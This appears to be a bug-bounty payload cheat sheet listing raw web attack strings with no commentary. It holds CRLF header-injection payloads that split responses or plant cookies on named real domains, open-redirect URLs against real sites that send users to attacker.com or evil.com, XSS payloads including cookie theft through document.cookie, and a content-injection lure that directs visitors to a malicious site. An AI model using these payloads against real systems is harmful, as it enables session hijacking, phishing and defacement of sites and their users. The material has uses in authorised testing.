# stuff-

crlf injection

%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2019%0d%0a%0d%0a<html>deface</html>

verify_token=%0aSet-Cookie:%20GerbenJavado=Awesome%3B%0a


%E5%98%8A%E5%98%8DSet-Cookie:%20test

%0d%0aMyheader:NewHeader

%0d%0aSet-Cookie:%20test=test;domain=.yelp.com

%0aSet-Cookie:NEW_COOKIE123

%0dSet-Cookie:test=test;domain=.vimeopro.com

%23%0dSet-Cookie:crlf=injection;domain=.sucuri.net;

%0dSet-Cookie:csrf_token=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;

%0aSet-Cookie:malicious_cookie1

http://greenhouse.io/%0d%0aSet-Cookie:test=test;domain=.greenhouse.io

%3f%0dSet-Cookie:crlf=injection%3bdomain=.testfire.net%3b

artsy.net
----------------------------------------
open redirect 

https://dev.twitter.com/https:/%5cblackfan.ru/
http://yelp.com//youtube.com

https://login.newrelic.com/login?return_to=///attacker.com

https://pornhub.com//www.google.com/%2f%2e%2e


https://hackerone.com/redirect?signature=e434aa5a63afdb51623e0cc08cb4aff4466814fe&url=http%3A%2F%2Fecommerce.shopify.com%2Faccounts%3Ffound_email%3Dtrue%26return_to%3D.mx%252F%26user%255Bemail%255D%3Demail%40email.com

https://www.zaption.com/logout?returnTo=///evil.com/

https://gogoair.com//gogoair.com

https://google.com/%2Fgoogle%252Ecom

https://it.mail.ru/en/users/register/?next=////www.evil.com/%2e%2e 



------------------
xss

alert(%2fxss%2f);%2f%2f
%3Cscript%3Eprompt('ZephrFish')%3C/script%3E
xx%27-alert(document.cookie)-%27

%22%3E<script>alert(9)</script>

</textarea><img src=x onerror=alert(1)>
%22%3E%3Cimg%20src=x%20onerror=prompt(document.domain)%3E
asdf"><img src=x onerror=prompt(1)>

%27%3E%3Ciframe/onload=alert(document.domain)%3E%3C/iframe%3E

"><svg/onload=confirm(document.domain)>

<svg><script xlink:href=data:,alert(1) />

<form action=javascript:alert(1)><input type=submit>

<html><script>alert(1)</script>

"></div></form></script><script>alert()</script><iframe src="www.google.com" onload="alert()">

-----------------
context injection


!!!ATENTION!%20This%20server%3Cscript%3Eprompt('ZephrFish')%3C/script%3E%20is%20on%20Maintenance%20please%20go%20to%20WWW.EVIL.COM%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20
